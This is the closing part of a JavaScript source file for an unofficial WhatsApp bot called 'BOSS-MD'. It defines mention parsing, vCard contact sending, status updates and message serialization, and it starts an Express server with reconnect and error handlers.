    conn.parseMention = async(text) => {
        return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net');
    };

    conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
        let list = [];
        for (let i of kon) {
            list.push({
                displayName: await conn.getName(i + '@s.whatsapp.net'),
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(i + '@s.whatsapp.net')}\nFN:${global.OwnerName}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${global.email}\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${global.github}/khan-xmd\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${global.location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
            });
        }
        conn.sendMessage(jid, {
            contacts: {
                displayName: `${list.length} Contact`,
                contacts: list,
            },
            ...opts,
        }, { quoted });
    };

    conn.setStatus = status => {
        conn.query({
            tag: 'iq',
            attrs: {
                to: '@s.whatsapp.net',
                type: 'set',
                xmlns: 'status',
            },
            content: [{
                tag: 'status',
                attrs: {},
                content: Buffer.from(status, 'utf-8'),
            }],
        });
        return status;
    };
    
    conn.serializeM = mek => sms(conn, mek, store);
}

app.get("/", (req, res) => {
    res.send("BOSS-MD⁸⁷³ STARTED ✅");
});

app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));

// ✅ FIXED: Start bot with proper error handling
setTimeout(() => {
    connectToWA().catch(err => {
        console.error("❌ Failed to start bot:", err.message);
        console.log("🔄 Retrying in 5 seconds...");
        setTimeout(() => connectToWA(), 5000);
    });
}, 5000);

process.on('SIGINT', () => {
    console.log('Cleaning up before exit...');
    if (memoryCleanInterval) clearInterval(memoryCleanInterval);
    process.exit(0);
});

process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err.message);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});
